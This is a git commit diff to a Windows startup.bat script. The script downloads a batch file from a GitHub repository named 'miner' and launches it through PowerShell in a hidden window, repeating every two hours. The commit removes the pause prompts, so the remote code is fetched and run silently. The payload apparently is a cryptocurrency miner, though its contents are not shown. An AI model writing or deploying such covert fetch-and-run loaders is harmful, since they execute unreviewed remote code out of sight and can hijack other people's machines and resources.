1e717afa69467007d0f8378e4a22adc3b81b114a
nmshare <128151412+nmshare@users.noreply.github.com>
2023-03-31 17:32:57 +0300

    Update startup.bat

--- startup.bat
+++ startup.bat
@@ -1,8 +1,6 @@
 :start
 del C:\temp\temp.bat
-pause
 curl -o C:\temp\temp.bat https://raw.githubusercontent.com/nmshare/miner/main/start.bat
-pause
 powershell start-process C:\temp\temp.bat -windowStyle Hidden
 echo "process started successfully"
 timeout /t 7200
